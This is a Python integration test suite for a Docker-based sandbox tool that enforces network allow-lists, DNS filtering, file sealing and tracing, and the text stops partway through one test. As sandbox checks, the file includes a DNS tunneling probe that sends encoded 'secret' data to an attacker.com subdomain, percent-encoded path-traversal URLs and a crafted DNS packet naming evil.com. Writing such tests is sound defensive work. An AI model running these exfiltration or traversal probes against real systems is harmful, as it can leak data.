#!/usr/bin/env python3
"""Integration tests against real Docker/Sysbox. Use --list to find a group."""

import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import ExitStack
from dataclasses import dataclass, field
import gzip
import json
import os
from pathlib import Path
import pty
import re
import shlex
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import termios
import time
import traceback
from typing import Callable

REPO_ROOT = Path(__file__).resolve().parent.parent


class TestFailure(Exception):
    pass


@dataclass
class Context:
    number: int
    membrane_cmd: str
    workdir: Path
    environment: dict
    output: list = field(default_factory=list)
    invocation: int = 0
    last_command: str = ""


def check(ctx, condition, description):
    if not condition:
        raise TestFailure(description + "\n" + ctx.last_command)
    ctx.output.append("PASS " + description)


def command_details(args, expected, actual, stdout, stderr):
    return (f"$ {shlex.join(map(str, args))}\n"
            f"expected exit: {expected}; actual exit: {actual}\n"
            f"stdout:\n{stdout}\nstderr:\n{stderr}")


def start_process(args, *, detach=False, **kwargs):
    if detach or sys.platform != "linux":
        return subprocess.Popen(args, start_new_session=True, **kwargs)
    # Keep the native host's controlling terminal and sudo timestamp, but give
    # each command its own process group for timeout cleanup. A small exec
    # wrapper supports Python 3.10 without preexec_fn in our threaded runner.
    return subprocess.Popen([sys.executable, "-c",
                             "import os, sys; os.setpgrp(); os.execvp(sys.argv[1], sys.argv[1:])",
                             *args], **kwargs)


def run(ctx, args, *, cwd=None, env=None, input=None, timeout=120, expected=0):
    """Capture every command; expected=None leaves status checks to the caller."""
    cwd = cwd if cwd is not None else ctx.workdir
    env = env if env is not None else (ctx.environment if ctx else None)
    actual, stdout, stderr = "not started", "", ""
    problem = None
    try:
        with start_process(args, detach=ctx is None, cwd=cwd, env=env, text=True,
                           stdin=subprocess.PIPE if input is not None else subprocess.DEVNULL,
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE) as process:
            try:
                stdout, stderr = process.communicate(input, timeout=timeout)
            except subprocess.TimeoutExpired:
                # Give Membrane and its children time to clean up on SIGTERM.
                try:
                    os.killpg(process.pid, signal.SIGTERM)
                except ProcessLookupError:
                    pass
                try:
                    stdout, stderr = process.communicate(timeout=20)
                except subprocess.TimeoutExpired:
                    try:
                        os.killpg(process.pid, signal.SIGKILL)
                    except ProcessLookupError:
                        pass
                    stdout, stderr = process.communicate()
                problem = f"timed out after {timeout}s"
            actual = process.returncode
    except OSError as error:
        problem = str(error)
    details = command_details(args, expected if expected is not None else "any", actual, stdout, stderr)
    if ctx:
        ctx.last_command = details
        with (ctx.workdir / "commands.log").open("a") as log:
            log.write(f"cwd: {cwd}\n{details}\n\n")
    if problem or (expected is not None and actual != expected):
        label = f"group {ctx.number:02}" if ctx else "warmup"
        raise TestFailure(f"{label}: {problem or 'unexpected exit status'}\n{details}")
    return subprocess.CompletedProcess(args, actual, stdout, stderr)


def membrane(ctx, command, *, options=(), **kwargs):
    """Run an ordinary non-tracing workload and retain its session ID for logs."""
    ctx.invocation += 1
    return run(ctx, [ctx.membrane_cmd, "--no-update", "--no-trace", "--no-global-config",
                     f"--session-id-file={ctx.workdir / f'session-id-{ctx.invocation}'}",
                     *options, "--", *command], **kwargs)


def config(ctx, contents):
    (ctx.workdir / ".membrane.yaml").write_text(contents)


def http(ctx, description, expected, url, *, method="GET", options=(), curl_options=()):
    command = ["curl", "-svL", "-m", "5"]
    if method != "GET":
        command += ["-X", method]
    # As in the old tests, examine the first verbose HTTP response, even if
    # curl later fails while following a redirect. "HTTP" means any response.
    result = membrane(ctx, [*command, *curl_options, url], options=options, expected=None)
    response = next((line.strip() for line in (result.stdout + result.stderr).splitlines()
                     if "< HTTP" in line), "")
    check(ctx, expected in response, f"{description} (expected {expected}, got {response!r})")


def exit_status(ctx, description, expected, command, *, options=()):
    membrane(ctx, command, options=options, expected=expected)
    check(ctx, True, f"{description} (exit {expected})")


def dns(ctx, description, expected, command):
    result = membrane(ctx, command)
    match = re.search(r"status: ([A-Z]+)", result.stdout)
    status = match.group(1) if match else "no DNS status"
    check(ctx, status == expected, f"{description} (expected {expected}, got {status})")


def group_1(ctx):
    config(ctx, """allow:
  - httpbin.org
""")
    http(ctx, '1A plain hostname GET / passthrough', '200',
         'https://httpbin.org/anything/root')
    http(ctx, '1B plain hostname POST / passthrough (origin decides)', 'HTTP',
         'https://httpbin.org/anything/root', method='POST')


def group_2(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org/anything/posts/
""")
    http(ctx, '2A bare URL entry GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '2B bare URL entry GET / blocked', '403',
         'https://httpbin.org/')
    http(ctx, '2C bare URL entry POST /anything/posts/ allowed (no method constraint)', 'HTTP',
         'https://httpbin.org/anything/posts/', method='POST')


def group_3(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
""")
    http(ctx, '3A method constraint GET / allowed', '200',
         'https://httpbin.org/anything/root')
    http(ctx, '3B method constraint POST / blocked', '403',
         'https://httpbin.org/anything/root', method='POST')


def group_4(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org/anything/posts/
    http:
      - methods: [GET]
""")
    http(ctx, '4A method+url_path GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '4B method+url_path GET /anything/posts/on-the-money/ allowed', '200',
         'https://httpbin.org/anything/posts/on-the-money/')
    http(ctx, '4C method+url_path POST /anything/posts/ blocked (wrong method)', '403',
         'https://httpbin.org/anything/posts/', method='POST')
    http(ctx, '4D method+url_path GET / blocked (outside url_path)', '403',
         'https://httpbin.org/')


def group_5(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts/
""")
    http(ctx, '5A absolute path GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '5B absolute path GET / blocked', '403',
         'https://httpbin.org/')
    http(ctx, '5C absolute path POST /anything/posts/ blocked (wrong method)', '403',
         'https://httpbin.org/anything/posts/', method='POST')


def group_6(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org/anything/posts/
    http:
      - methods: [GET]
        paths:
          - on-the-money/
""")
    http(ctx, '6A relative path GET /anything/posts/on-the-money/ allowed', '200',
         'https://httpbin.org/anything/posts/on-the-money/')
    http(ctx, '6B relative path GET / blocked (outside dest path)', '403',
         'https://httpbin.org/')


def group_7(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts/
      - methods: [GET]
        paths:
          - /anything/about
""")
    http(ctx, '7A multiple rules GET /anything/posts/ allowed (rule 1)', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '7B multiple rules GET /anything/about allowed (rule 2)', '200',
         'https://httpbin.org/anything/about')
    http(ctx, '7C multiple rules GET / blocked (no rule matches)', '403',
         'https://httpbin.org/')
    http(ctx, '7D multiple rules POST /anything/posts/ blocked (wrong method)', '403',
         'https://httpbin.org/anything/posts/', method='POST')


def group_8(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org/anything/posts/
  - dest: https://httpbin.org/anything/about
""")
    http(ctx, '8A multiple entries GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '8B multiple entries GET /anything/about allowed', '200',
         'https://httpbin.org/anything/about')
    http(ctx, '8C multiple entries GET / blocked', '403',
         'https://httpbin.org/')


def group_9(ctx):
    config(ctx, "")
    exit_status(ctx, '9A host not in allow list fails', 6,
                ['curl', '-sf', '-m', '5', 'https://example.com'])


def group_10(ctx):
    http(ctx, '10A CLI bare URL GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/', options=['--allow=https://httpbin.org/anything/posts/'])
    http(ctx, '10B CLI bare URL GET / blocked', '403',
         'https://httpbin.org/', options=['--allow=https://httpbin.org/anything/posts/'])
    http(ctx, '10C CLI plain hostname GET / passthrough', '200',
         'https://httpbin.org/anything/root', options=['--allow=httpbin.org'])


def group_11(ctx):
    config(ctx, """allow:
  - github.com
""")
    dns(ctx, '11A DNS allowed domain resolves', 'NOERROR', ['dig', 'github.com'])
    dns(ctx, '11B DNS blocked domain gets NXDOMAIN', 'NXDOMAIN', ['dig', 'google.com'])
    # c2VjcmV0Cg== is base64("secret\n"), the old tunneling payload.
    dns(ctx, '11C DNS tunneling attempt gets NXDOMAIN', 'NXDOMAIN', ['dig', 'c2VjcmV0Cg==.exfil.attacker.com'])
    exit_status(ctx, '11D DNS direct resolver bypass blocked', 9,
                ['dig', '@8.8.8.8', 'github.com'], options=['--allow=github.com'])


def group_12(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts/
""")
    http(ctx, '12A path boundary GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '12B path boundary GET /anything/posts/on-the-money/ allowed (subpath)', '200',
         'https://httpbin.org/anything/posts/on-the-money/')
    http(ctx, '12C path boundary GET /anything/posts-evil blocked (no boundary)', '403',
         'https://httpbin.org/anything/posts-evil')


def group_13(ctx):
    config(ctx, """allow:
  - dest: httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts/
""")
    http(ctx, '13A host-type http rules GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '13B host-type http rules GET / blocked', '403',
         'https://httpbin.org/')
    http(ctx, '13C host-type http rules POST /anything/posts/ blocked', '403',
         'https://httpbin.org/anything/posts/', method='POST')


def group_14(ctx):
    filesystem_case(ctx, sealed=True)


def group_15(ctx):
    ip = socket.gethostbyname('httpbin.org')
    config(ctx, f"""allow:
  - dest: {ip}
    http:
      - methods: [GET]
        paths:
          - /anything/posts/
""")
    http(ctx, '15A CIDR http rules GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/', curl_options=['--resolve', f'httpbin.org:443:{ip}'])
    http(ctx, '15B CIDR http rules GET / blocked', '403',
         'https://httpbin.org/', curl_options=['--resolve', f'httpbin.org:443:{ip}'])
    http(ctx, '15C CIDR http rules POST /anything/posts/ blocked (wrong method)', '403',
         'https://httpbin.org/anything/posts/', method='POST', curl_options=['--resolve', f'httpbin.org:443:{ip}'])


def group_16(ctx):
    config(ctx, "allow:\n  - github.com\n")
    result = membrane(ctx, ["python3", "-c", r'''
import socket, struct, subprocess
routes = subprocess.check_output(["ip", "route"]).decode()
gateway = next(line.split()[2] for line in routes.splitlines() if "default" in line)
names = ["github.com", "evil.com"]
packet = struct.pack("!HHHHHH", 0x1234, 0x0100, len(names), 0, 0, 0)
for name in names:
    for part in name.split("."):
        packet += bytes([len(part)]) + part.encode()
    packet += b"\x00" + struct.pack("!HH", 1, 1)
with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
    sock.settimeout(3)
    sock.sendto(packet, (gateway, 53))
    response, _ = sock.recvfrom(512)
print("RCODE", response[3] & 0x0F)
'''])
    check(ctx, "RCODE 3" in result.stdout,
          "16A multi-question DNS packet blocked (NXDOMAIN)")


def group_17(ctx):
    config(ctx, """allow:
  - 8.8.8.8
""")
    exit_status(ctx, '17A UDP blocked by default to allowed IP', 9,
                ['dig', '@8.8.8.8', 'github.com'])
    http(ctx, '17B TCP still works to allowed IP', 'HTTP',
         'https://8.8.8.8/')
    config(ctx, """allow:
  - dest: 8.8.8.8
    ports: [53/udp]
""")
    exit_status(ctx, '17C UDP opt-in allows DNS', 0,
                ['dig', '@8.8.8.8', 'github.com'])


def group_18(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts/
""")
    http(ctx, '18A dot-segment traversal blocked', '403',
         'https://httpbin.org/anything/posts/../', curl_options=['--path-as-is'])
    http(ctx, '18B double dot-segment blocked', '403',
         'https://httpbin.org/anything/posts/on-the-money/../../', curl_options=['--path-as-is'])
    http(ctx, '18C percent-encoded traversal outside allowed path blocked', '403',
         'https://httpbin.org/anything/posts/%2e%2e/', curl_options=['--path-as-is'])
    http(ctx, '18D double-encoded traversal outside allowed path blocked', '403',
         'https://httpbin.org/anything/posts/%252e%252e/', curl_options=['--path-as-is'])
    http(ctx, '18E normal path still allowed', '200',
         'https://httpbin.org/anything/posts/')


def group_19(ctx):
    config(ctx, """allow:
  - dest: github.com
    http:
      - methods: [GET]
        paths:
          - /
""")
    exit_status(ctx, '19A raw TCP blocked to host with http-only rules', 1,
                ["bash", "-c", 'sleep 3 | ncat -w3 github.com 22 2>&1 | grep -q SSH'])
    config(ctx, """allow:
  - github.com
""")
    exit_status(ctx, '19B raw TCP allowed to plain hostname', 0,
                ["bash", "-c", 'sleep 3 | ncat -w3 github.com 22 2>&1 | grep -q SSH'])
    config(ctx, """allow:
  - dest: github.com
    http:
      - methods: [GET]
        paths:
          - /
  - dest: github.com
    ports: [22/tcp]
""")
    exit_status(ctx, '19C raw TCP allowed on explicitly permitted port alongside http rules', 0,
                ["bash", "-c", 'sleep 3 | ncat -w3 github.com 22 2>&1 | grep -q SSH'])


def group_20(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org/anything/posts/
    http:
      - methods: [GET]
        paths:
          - on-the-money/
""")
    http(ctx, '20A URL+http GET /anything/posts/on-the-money/ allowed', '200',
         'https://httpbin.org/anything/posts/on-the-money/')
    http(ctx, '20B URL+http GET /anything/posts/ blocked (outside path constraint)', '403',
         'https://httpbin.org/anything/posts/')
    http(ctx, '20C URL+http POST /anything/posts/on-the-money/ blocked (wrong method)', '403',
         'https://httpbin.org/anything/posts/on-the-money/', method='POST')
    http(ctx, '20D URL+http GET / blocked (outside url prefix)', '403',
         'https://httpbin.org/')


def group_21(ctx):
    ip = socket.gethostbyname('github.com')
    config(ctx, f"""allow:
  - dest: {ip}
    http:
      - methods: [GET]
        paths:
          - /
""")
    exit_status(ctx, '21A CIDR http-only rules block raw TCP', 1,
                ["bash", "-c", f'sleep 3 | ncat -w3 {ip} 22 2>&1 | grep -q SSH'])
    http(ctx, '21B CIDR http rules still allow HTTP', '200',
         'https://github.com/', curl_options=['--resolve', f'github.com:443:{ip}'])


def group_22(ctx):
    config(ctx, """allow:
  - dest: portquiz.takao-tech.com
    http:
      - methods: [GET]
        paths:
          - /allowed/
""")
    http(ctx, '22A http rules enforced on non-standard port 8443', '403',
         'https://portquiz.takao-tech.com:8443/')
    http(ctx, '22B http rules allow correct path on non-standard port 8443', 'HTTP',
         'https://portquiz.takao-tech.com:8443/allowed/')


def group_23(ctx):
    config(ctx, """allow:
  - "*.httpbin.org"
""")
    exit_status(ctx, '23A host pattern *.httpbin.org blocks apex httpbin.org', 6,
                ['curl', '-sf', '-m', '5', 'https://httpbin.org/'])
    config(ctx, """allow:
  - "*.github.com"
""")
    http(ctx, '23B host pattern *.github.com allows api.github.com', '200',
         'https://api.github.com/')
    exit_status(ctx, '23C host pattern *.github.com blocks apex github.com', 6,
                ['curl', '-sf', '-m', '5', 'https://github.com/'])


def group_24(ctx):
    config(ctx, """allow:
  - "*"
""")
    http(ctx, '24A bare * allows arbitrary host', '200',
         'https://httpbin.org/anything/root')
    http(ctx, '24B bare * allows another arbitrary host', '200',
         'https://api.github.com/')
    config(ctx, """allow:
  - dest: "*"
    ports: [443/tcp]
""")
    exit_status(ctx, '24C bare * with ports:[443/tcp] blocks SSH port 22', 1,
                ["bash", "-c", 'sleep 3 | ncat -w3 github.com 22 2>&1 | grep -q SSH'])
    http(ctx, '24D bare * with ports:[443/tcp] allows HTTPS', '200',
         'https://httpbin.org/anything/root')

class Session:
    """A live workload with file readiness gates, optional terminal, and cleanup.

    Prepare directory first, then use with Session(...) (or ExitStack) so every
    started process is stopped even when a host-side assertion fails.
    """

    def __init__(self, ctx, directory, command, *, options=(), env=None, terminal=False):
        self.ctx, self.directory = ctx, directory
        self.idfile = directory / "session-id"
        self.args = [ctx.membrane_cmd, "--no-update", "--no-global-config",
                     f"--session-id-file={self.idfile}", *options, "--", *command]
        self.env = env if env is not None else ctx.environment
        self.use_terminal = terminal
        self.terminal = None
        self.terminal_state = None
        self.process = None
        self.log = None

    def __enter__(self):
        try:
            self.log = (self.directory / "output.log").open("w")
            if self.use_terminal:
                self.terminal = pty.openpty()
                self.terminal_state = termios.tcgetattr(self.terminal[1])
            self.process = start_process(
                self.args, cwd=self.directory, env=self.env,
                stdin=self.terminal[1] if self.terminal else subprocess.DEVNULL,
                stdout=self.log, stderr=self.log)
        except OSError as error:
            self.close()
            raise TestFailure(f"group {self.ctx.number}: {error}\n" + command_details(
                self.args, "started", "not started", "", "")) from error
        return self

    def __exit__(self, *_):
        self.close()

    @property
    def id(self):
        return self.idfile.read_text().strip()

    def output(self):
        return (self.directory / "output.log").read_text()

    def details(self, expected):
        return command_details(self.args, expected, self.process.poll(),
                               self.output(), "(merged into stdout)")

    def wait_for(self, marker, timeout=90):
        deadline = time.monotonic() + timeout
        while not (self.directory / marker).exists():
            if self.process.poll() is not None or time.monotonic() > deadline:
                raise TestFailure(f"group {self.ctx.number}: session did not reach {marker}\n"
                                  + self.details("running until ready"))
            time.sleep(0.1)

    def release(self, marker="continue"):
        (self.directory / marker).touch()

    def wait(self, expected=0, timeout=90):
        try:
            code = self.process.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            raise TestFailure(f"group {self.ctx.number}: session timed out after {timeout}s\n"
                              + self.details(expected)) from None
        details = self.details(expected)
        self.ctx.last_command = details
        with (self.ctx.workdir / "commands.log").open("a") as log:
            log.write(details + "\n\n")
        if expected is not None and code != expected:
            raise TestFailure(f"group {self.ctx.number}: unexpected session exit\n" + details)
        if expected is not None:
            check(self.ctx, True, f"{self.directory.name}: exit {code}")
        return self.output()

    def close(self):
        try:
            if self.process is not None:
                try:
                    os.killpg(self.process.pid, signal.SIGTERM)
                except ProcessLookupError:
                    pass
                try:
                    self.process.wait(timeout=20)
                except subprocess.TimeoutExpired:
                    pass
                # Membrane gets the first chance to clean up; reap leftover CLI
                # children even if the leader has already exited.
                try:
                    os.killpg(self.process.pid, signal.SIGKILL)
                except ProcessLookupError:
                    pass
                self.process.wait()
        finally:
            if self.log is not None:
                self.log.close()
            if self.terminal:
                try:
                    if self.terminal_state is not None:
                        termios.tcsetattr(self.terminal[1], termios.TCSANOW, self.terminal_state)
                finally:
                    for fd in self.terminal:
                        os.close(fd)
                    self.terminal = None


def trace_events(ctx, path):
    # Reading to EOF verifies the gzip CRC/trailer and every JSONL record.
    with gzip.open(path, "rt") as stream:
        events = [json.loads(line) for line in stream]
    check(ctx, bool(events), "valid nonempty gzip JSONL: " + str(path))
    return events


def check_events(ctx, events, token, port, output, executable="/workspace/trace-workload"):
    check(ctx, any(e.get("type") == "process_exec" and e.get("argv", "").startswith(executable + " " + token + " ")
              for e in events), token + ": first exec")
    check(ctx, any(e.get("type") == "file_open" and e.get("path") == "/tmp/" + token + ".write"
              and e["flags"] & 3 in (1, 2)
              for e in events), token + ": immediate write-open")
    check(ctx, any(e.get("type") == "socket_connect" and e.get("daddr") == "198.51.100.7" and e.get("dport") == port
              for e in events), token + ": IPv4 connect")
    check(ctx, any(e.get("type") == "socket_connect" and e.get("family") == 2
              and e.get("daddr") == "127.0.0.1" and e.get("dport") == port + 10
              for e in events), token + ": IPv4 loopback connect")
    if "IPV6 " + token + " true" in output:
        check(ctx, any(e.get("type") == "socket_connect" and e.get("daddr") == "2001:db8::7" and e.get("dport") == port
                  for e in events), token + ": IPv6 connect")
        check(ctx, all(any(e.get("type") == "socket_connect" and e.get("family") == 10
                      and e.get("daddr") == addr and e.get("dport") == port + 10
                      for e in events) for addr in ("::1", "127.0.0.1")),
              token + ": IPv6 loopback and mapped-loopback connects")
    else:
        check(ctx, "IPV6 " + token + " false" in output, token + ": IPv6 availability reported")
        ctx.output.append("SKIP " + token + ": kernel cannot create IPv6 sockets")


def inspect(ctx, name):
    return json.loads(run(ctx, ["docker", "inspect", name]).stdout)[0]


def check_handler(ctx, session, traced=True, policy=False):
    data = inspect(ctx, "membrane-handler-" + session.id)
    cfg = data["HostConfig"]
    caps = {c.removeprefix("CAP_") for c in cfg.get("CapAdd") or []}
    expected = {"NET_ADMIN", "BPF", "PERFMON"} if traced or policy else {"NET_ADMIN"}
    check(ctx, caps == expected and not cfg["Privileged"] and cfg["PidMode"] != "host", "handler capabilities and namespaces")
    mounts = {m["Destination"]: m for m in data["Mounts"]}
    kernel = {"/sys/fs/cgroup", "/sys/kernel/tracing"}
    check(ctx, kernel.intersection(mounts) == (kernel if traced else {"/sys/fs/cgroup"} if policy else set())
          and all(not mounts[p]["RW"] for p in kernel.intersection(mounts))
          and ("/trace" in mounts) == traced, "tracing mounts match --no-trace setting")
    if policy:
        check(ctx, "/sys/kernel/security" not in mounts
              and all(p in mounts and not mounts[p]["RW"] for p in ("/policy-workspace", "/etc/membrane/policy.json"))
              and mounts["/policy-pins"]["RW"], "trusted enrollment and pin mounts")
    return data


def cleaned(ctx, session):
    host_prefix = ["colima", "ssh", "--profile", "membrane", "--"] if sys.platform == "darwin" else []
    resources = (("container", "agent"), ("container", "handler"), ("network", "internal"),
                 ("network", "external"), ("volume", "ca"))
    check(ctx, all(run(ctx, ["docker", kind, "inspect", "membrane-" + name + "-" + session.id], expected=None).returncode != 0
              for kind, name in resources), session.directory.name + ": session Docker resources removed")
    check(ctx, all(run(ctx, [*host_prefix, "test", "!", "-d", path], expected=None).returncode == 0 for path in
              ("/sys/fs/cgroup/membrane-" + session.id, "/sys/fs/cgroup/membrane" + session.id + ".slice")),
          session.directory.name + ": session parent removed")
    prefix = [*host_prefix, "sudo", "-n"] if sys.platform == "darwin" or os.geteuid() != 0 else []
    check(ctx, run(ctx, [*prefix, "test", "!", "-d", "/sys/fs/bpf/membrane/" + session.id], expected=None).returncode == 0,
          session.directory.name + ": mandatory policy pins removed")


def build_trace_workload(ctx):
    info = json.loads(run(ctx, ["docker", "info", "--format", "{{json .}}"]).stdout)
    check(ctx, "sysbox-runc" in info["Runtimes"], "Sysbox runtime available")
    ctx.output.append("ENV kernel=" + info["KernelVersion"] + " driver=" + info["CgroupDriver"] + " cgroup=" + info["CgroupVersion"])
    arch = {"aarch64": "arm64", "x86_64": "amd64"}.get(info["Architecture"], info["Architecture"])
    run(ctx, ["go", "build", "-buildvcs=false", "-o", str(ctx.workdir / "trace-workload"),
              str(REPO_ROOT / "scripts/testdata/trace-workload.go")],
        env=dict(ctx.environment, CGO_ENABLED="0", GOOS="linux", GOARCH=arch))


def trace_docker_env(ctx):
    # Pass through to real Docker. Hold one start to inspect pre-workload state;
    # separately remove tracing capabilities to exercise a real loader failure.
    wrapper = ctx.workdir / "bin"
    wrapper.mkdir()
    shim = wrapper / "docker"
    shim.write_text(f'''#!{sys.executable}
import os, sys, time
from pathlib import Path
args = sys.argv[1:]
if args[0] == "run" and "membrane-handler" in args and os.getenv("FAIL_BPF"):
    args = [a for a in args if a not in ("--cap-add=BPF", "--cap-add=PERFMON")]
if args[0] == "start" and os.getenv("CHECK_START"):
    gate = Path(os.environ["CHECK_START"])
    (gate / "before-start").touch()
    deadline = time.monotonic() + 90
    while not (gate / "start").exists():
        if time.monotonic() >= deadline:
            sys.exit("test start gate timed out")
        time.sleep(0.05)
os.execv({shutil.which("docker")!r}, ["docker"] + args)
''')
    shim.chmod(0o755)
    return dict(ctx.environment, PATH=str(wrapper) + os.pathsep + ctx.environment["PATH"])


def trace_session(ctx, token, port, *, traced=True, dind=False, env=None, terminal=False):
    directory = ctx.workdir / token
    directory.mkdir()
    shutil.copy2(ctx.workdir / "trace-workload", directory / "trace-workload")
    options = ["--trace-log=" + str(directory / "trace.jsonl.gz")]
    if not traced:
        options.append("--no-trace")
    command = ["/workspace/trace-workload", token, str(port), "tty" if terminal else "hold"]
    if dind:
        command.append("dind")
    return Session(ctx, directory, command, options=options, env=env, terminal=terminal)


def group_25(ctx):
    base = ctx.workdir
    host_prefix = ["colima", "ssh", "--profile", "membrane", "--"] if sys.platform == "darwin" else []
    build_trace_workload(ctx)
    env = trace_docker_env(ctx)
    with ExitStack() as sessions:
        a = sessions.enter_context(trace_session(
            ctx, "trace-a", 45101, dind=True, env=dict(env, CHECK_START=str(base / "trace-a"))))
        a.wait_for("before-start")
        agent, handler = inspect(ctx, "membrane-agent-" + a.id), check_handler(ctx, a)
        parent = agent["HostConfig"]["CgroupParent"]
        cgroup = "/sys/fs/cgroup/" + parent.lstrip("/")
        check(ctx, agent["State"]["Status"] == "created" and agent["State"]["Pid"] == 0
              and bool(parent) and handler["HostConfig"]["CgroupParent"] != parent
              and run(ctx, [*host_prefix, "test", "-d", cgroup], expected=None).returncode == 0, "session parent exists before workload, outside handler")
        check(ctx, "MEMBRANE_TARGET_CGROUP=" + cgroup in handler["Config"]["Env"]
              and run(ctx, ["docker", "exec", "membrane-handler-" + a.id, "test", "-f", "/tmp/tracer-ready"], expected=None).returncode == 0,
              "BPF scoped and ready before docker start")
        a.release("start")
        a.wait_for("trace-a.first")
        pid = inspect(ctx, "membrane-agent-" + a.id)["State"]["Pid"]
        check(ctx, run(ctx, [*host_prefix, "cat", f"/proc/{pid}/cgroup"]).stdout.strip().startswith("0::/" + parent.lstrip("/") + "/"),
              "workload runs beneath pre-created parent")
        b = sessions.enter_context(trace_session(ctx, "trace-b", 45102))
        b.wait_for("trace-b.first")
        run(ctx, ["docker", "run", "--rm", "--network=none", "-v", str(base / "trace-workload") + ":/probe:ro",
               "--entrypoint=/probe", "membrane-agent", "trace-other", "45301"])
        a.release()
        output_a = a.wait()  # Keep B active through A's inner Docker workload.
        b.release()
        output_b = b.wait()
        events_a, events_b = trace_events(ctx, a.directory / "trace.jsonl.gz"), trace_events(ctx, b.directory / "trace.jsonl.gz")
        check_events(ctx, events_a, "trace-a", 45101, output_a)
        check_events(ctx, events_b, "trace-b", 45102, output_b)
        check(ctx, any(e.get("type") == "file_open" and e.get("path") == "/etc/hostname"
                  and e["flags"] & 3 == 0 for e in events_a), "read-only file opens recorded")
        check(ctx, "trace-b" not in json.dumps(events_a) and "trace-a" not in json.dumps(events_b)
              and "trace-other" not in json.dumps(events_a + events_b), "concurrent sessions and unrelated container isolated")
        check(ctx, "DIND trace-a ok" in output_a, "inner Docker workload completed")
        check_events(ctx, events_a, "inner-trace-a", 45201, output_a, executable="/probe")
        cleaned(ctx, a)
        cleaned(ctx, b)


def group_26(ctx):
    filesystem_case(ctx, sealed=False)


def group_27(ctx):
    for path in ("config/settings.yaml", "config/secrets.txt", "sealed/readonly/child"):
        target = ctx.workdir / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text("fixture data\n")
    config(ctx, "readonly:\n  - config/\n  - sealed/readonly/\nignore:\n  - config/secrets.txt\n  - sealed/\n")
    copy_policy_workload(ctx.workdir)
    result = membrane(ctx, ["sudo", "python3", "/workspace/policy-workload.py", "precedence"])
    ctx.output.extend(line for line in result.stdout.splitlines() if line.startswith("PASS "))
    check(ctx, True, "27A overlapping rules start successfully; SEALED dominates READONLY")


def copy_policy_workload(directory):
    shutil.copy2(REPO_ROOT / "scripts/testdata/policy-workload.py", directory / "policy-workload.py")


def filesystem_case(ctx, sealed):
    build_trace_workload(ctx)
    base = ctx.workdir
    (base / "secrets/sub").mkdir(parents=True)
    for path, data in (("protected", "protected data\n"), ("secrets/api-key.txt", "api-key-value\n"),
                       ("ordinary", "ordinary\n"), ("replacement", "replacement\n")):
        (base / path).write_text(data)
    (base / "symlink").symlink_to("protected")
    os.link(base / "protected", base / "hardlink")
    shutil.copy2(base / "trace-workload", base / "protected-exec")
    config(ctx, ("ignore" if sealed else "readonly") + ":\n  - protected\n  - protected-exec\n  - secrets/\n")
    copy_policy_workload(base)
    # Linux xattr APIs are absent from macOS Python. Prepare metadata using
    # Linux's view of the same workspace, outside any Membrane policy session.
    prepared = run(ctx, ["docker", "run", "--rm", "--network=none", "-v", str(base) + ":/workspace",
                         "-w", "/workspace", "--entrypoint=python3", "membrane-agent",
                         "/workspace/policy-workload.py", "prepare"])
    ctx.output.extend(line for line in prepared.stdout.splitlines() if line.startswith(("PASS ", "SKIP ")))
    with Session(ctx, base, ["sudo", "python3", "/workspace/policy-workload.py",
                            "sealed" if sealed else "readonly"], options=["--no-trace"]) as session:
        session.wait_for("ready")
        check(ctx, (base / "protected").read_text() == "protected data\n", "host can read protected object")
        (base / "protected").write_text("host modified protected object\n")
        (base / "secrets/api-key.txt").write_text("host modified child\n")
        (base / "host-new").write_text("host\n")
        check(ctx, (base / "protected").read_text().startswith("host modified"), "host can modify enrolled objects")
        session.release()
        output = session.wait()
        ctx.output.extend(line for line in output.splitlines() if line.startswith("PASS "))
        cleaned(ctx, session)


def group_28(ctx):
    build_trace_workload(ctx)
    with trace_session(ctx, "trace-disabled", 45103, traced=False) as n:
        n.wait_for("trace-disabled.first")
        check_handler(ctx, n, traced=False)
        n.release()
        n.wait()
        check(ctx, not (n.directory / "trace.jsonl.gz").exists(), "--no-trace produces no trace file")
        cleaned(ctx, n)

    env = trace_docker_env(ctx)
    with trace_session(ctx, "trace-failed", 45105, env=dict(env, FAIL_BPF="1")) as failed:
        failed_output = failed.wait(expected=None, timeout=60)
        check(ctx, failed.process.returncode != 0 and "load eBPF objects" in failed_output,
              "BPF load failure aborts setup clearly")
        check(ctx, not (failed.directory / "trace-failed.first").exists(), "failed loading never starts workload")
        cleaned(ctx, failed)


def group_29(ctx):
    build_trace_workload(ctx)
    run(ctx, [ctx.membrane_cmd, "--no-update", "--no-global-config",
              "--trace-log=" + str(ctx.workdir / "exit37.gz"), "--", "bash", "-c", "exit 37"],
        timeout=60, expected=37)
    check(ctx, True, "workload exit 37 preserved")

    with trace_session(ctx, "trace-terminal", 45104, terminal=True) as terminal:
        terminal.wait_for("trace-terminal.first")
        master, slave = terminal.terminal
